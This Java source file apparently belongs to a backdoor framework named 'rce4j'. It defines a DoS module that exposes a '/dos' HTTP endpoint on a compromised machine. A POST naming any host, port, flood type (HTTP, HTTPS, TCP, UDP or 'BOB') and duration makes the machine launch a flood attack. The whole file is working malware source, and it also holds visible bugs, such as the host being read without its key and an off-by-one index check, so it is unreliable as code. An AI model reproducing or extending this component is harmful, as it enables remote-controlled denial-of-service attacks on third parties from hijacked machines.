package org.rce4j.module.impl.http;

import org.rce4j.exception.HttpException;
import org.rce4j.module.BackdoorHttpModule;
import org.rce4j.module.event.BackdoorHttpEvent;
import org.rce4j.net.HttpCode;
import org.rce4j.net.RequestType;
import org.rce4j.net.dos.AttackMethod;
import org.rce4j.net.dos.DosAttack;
import org.rce4j.validator.JsonObjectValidator;
import org.rce4j.validator.JsonPrimitiveValidator;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;

public class DosModule extends BackdoorHttpModule {
    public DosModule() {
        this(List.of(
                AttackMethod.HTTP_FLOOD,
                AttackMethod.HTTPS_FLOOD,
                AttackMethod.TCP_FLOOD,
                AttackMethod.UDP_FLOOD,
                AttackMethod.BOB));
    }
    
    public DosModule(AttackMethod... attackMethods) {
        this(Arrays.asList(attackMethods));
    }
    
    public DosModule(List<AttackMethod> attackMethods) {
        super("dos", "/dos", Map.of(
                RequestType.POST, new JsonObjectValidator(Map.of(
                        "host", new JsonPrimitiveValidator(String.class),
                        "port", new JsonPrimitiveValidator(int.class),
                        "attackMethod", new JsonPrimitiveValidator(int.class),
                        "power", new JsonPrimitiveValidator(int.class),
                        "duration", new JsonPrimitiveValidator(long.class)
                ))
        ));
        attackMethodRegistrar.addAll(attackMethods);
    }
    
    private final List<AttackMethod> attackMethodRegistrar = new ArrayList<>();
    
    @Override
    public void onPost(BackdoorHttpEvent event) throws HttpException {
        String host = event.getBody().getAsJsonPrimitive().getAsString();
        
        int port = event.getBody().getAsJsonPrimitive("port").getAsInt();
        
        long duration = event.getBody().getAsJsonPrimitive("duration").getAsLong();
        
        int attackMethodIndex = event.getBody().getAsJsonPrimitive("attackMethod").getAsInt();
        
        DosAttack dosAttack = getDosAttack(host, port, attackMethodIndex, duration);
        dosAttack.execute();
        
        event.status(HttpCode.ACCEPTED_202);
    }
    
    private DosAttack getDosAttack(String host, int port, int attackMethodIndex, long duration) throws HttpException {
        if (attackMethodIndex < 0 || attackMethodIndex > attackMethodRegistrar.size())
            throw new HttpException(400, "Bad attack method index '" + attackMethodIndex + "'");
        
        if (port < 1 || port > 65535)
            throw new HttpException(400, "Out of range port '" + port + "'");
        
        AttackMethod attackMethod = attackMethodRegistrar.get(attackMethodIndex);
        
        InetAddress address;
        try {
            address = InetAddress.getByName(host);
        } catch (IllegalArgumentException ignored) {
            throw new HttpException(400, "Bad ip '" + host + "'");
        } catch (UnknownHostException e) {
            throw new HttpException(400, "Unknown host '" + host + "'");
        }
        
        return duration != -1
                ? new DosAttack(address, port, attackMethod, duration)
                : new DosAttack(address, port, attackMethod);
    }
}
